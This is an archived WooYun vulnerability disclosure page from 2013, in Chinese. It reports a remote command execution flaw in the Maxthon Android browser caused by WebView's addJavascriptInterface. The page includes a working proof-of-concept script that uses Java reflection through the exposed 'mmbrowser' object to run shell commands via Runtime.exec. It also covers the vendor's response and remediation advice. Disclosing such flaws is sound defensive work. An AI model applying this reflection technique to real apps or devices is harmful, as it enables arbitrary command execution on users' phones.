@@ -1,0 +1,232 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		傲游云手机浏览器远程命令执行漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		傲游云手机浏览器远程命令执行漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/只抽红梅">只抽红梅</a> 
+</li><li>提交时间：		2013-09-04 16:44</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-04：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-04：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2013-11-30：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">没人发么？我来好了！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">安卓开发使用 WebView 组件中的 addJavascriptInterface 方法可以把 JAVA 中的方法公开给 JavaScript 调用，但是 JavaScript 在调用该方法的时候又可以反向把 JAVA 代码注入到 JAVA 代码中去执行，既然能够执行 JAVA 代码，这就产生了远程命令执行漏洞，然后就可以在权限范围内对手机做任何事情。<br />
+<br />
+算了不扯了，关于这个漏洞的相信信息请参考下面文章：<br />
+<br />
+http://50.56.33.56/blog/?p=314<br />
+<br />
+http://drops.wooyun.org/papers/548<br />
+<br />
+我觉得这种漏洞的利用有以下条件：<br />
+<br />
+1、客户端应用程序有通过 addJavascriptInterface 公开 JAVA 方法以供 JavaScript 调用（好像是废话哦）；<br />
+<br />
+2、用户通过客户端访问的页面内容必须是可控的，并且通过 WebView 组件来完成的；<br />
+<br />
+对于这个漏洞最好的检测方法当然是反编译 apk 文件，查看然后测试了。<br />
+<br />
+我觉得累，这里就拿傲游浏览器来快速对这个漏洞进行测试，过程如下：<br />
+<br />
+1、在安卓手机上安装好傲游浏览器（又是废话）；<br />
+<br />
+2、浏览一个页面，内容如下：<br />
+<br />
+</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;<br />
+for(w in window){<br />
+    document.write(w + &quot;&lt;br/&gt;&quot;);<br />
+}<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+上面代码会遍历所有的 window 对象然后打印到页面上；<br />
+<br />
+3、通过对返回的 window 对象进行目测判断是否存在该漏洞，比如傲游返回的内容：<br />
+<br />
+</p><p class="detail"><a href="../images/0416210335cc5f68127afc61ffea1955f4ef544f.png" target="_blank"><img src="../images/0416210335cc5f68127afc61ffea1955f4ef544f.png" alt="mx_android_1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+可以大致判断 mmbrowser 是公开出 JavaScript 调用的（不见得都是对的）<br />
+<br />
+4、构造 POC：<br />
+<br />
+</p><pre><code>&lt;script type=&quot;text/javascript&quot;&gt;<br />
+function execute(cmdArgs)<br />
+{<br />
+    return mmbrowser.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(cmdArgs);<br />
+}<br />
+<br />
+try{<br />
+    execute([&quot;/system/bin/sh&quot;,&quot;-c&quot;,&quot;echo &#039;maxthon browser for android remote command execute&#039; &gt; /sdcard/maxthon.txt&quot;]);<br />
+    alert(&quot;good job!&quot;);<br />
+}catch(e){<br />
+    alert(e);<br />
+}<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+5、访问看效果<br />
+<br />
+</p><p class="detail"><a href="../images/04162334de753ae9a509e239efbe83385e74c161.png" target="_blank"><img src="../images/04162334de753ae9a509e239efbe83385e74c161.png" alt="mx_android_2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/04162350ecb015ed8a8fd2687d62e5f8d2fbc453.png" target="_blank"><img src="../images/04162350ecb015ed8a8fd2687d62e5f8d2fbc453.png" alt="mx_android_3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/0416240605fa0a96b8c2b62c038b7e6a24ed7c63.png" target="_blank"><img src="../images/0416240605fa0a96b8c2b62c038b7e6a24ed7c63.png" alt="mx_android_4.png" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">如下：<br />
+<br />
+</p><p class="detail"><a href="../images/04162350ecb015ed8a8fd2687d62e5f8d2fbc453.png" target="_blank"><img src="../images/04162350ecb015ed8a8fd2687d62e5f8d2fbc453.png" alt="mx_android_3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/0416240605fa0a96b8c2b62c038b7e6a24ed7c63.png" target="_blank"><img src="../images/0416240605fa0a96b8c2b62c038b7e6a24ed7c63.png" alt="mx_android_4.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">借用 livers 的修复方法：<br />
+<br />
+1、Android 4.2 （api17）已经开始采用新的接口函数【java中应该叫方法：） 】，@JavascriptInterface  代替addjavascriptInterface, 有些android 2.3不再升级，浏览器需要兼容。<br />
+<br />
+<br />
+<br />
+2、在使用js2java的bridge时候，需要对每个传入的参数进行验证，屏蔽攻击代码。<br />
+<br />
+<br />
+<br />
+3、控制相关权限或者尽可能不要使用js2java的bridge </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/只抽红梅" title="只抽红梅">只抽红梅</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-036094" title="傲游云手机浏览器远程命令执行漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-09-04 17:17</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-09-05：已提交开发处理. 不知道为什么提交了回复还是变成忽略了.</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="36094";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
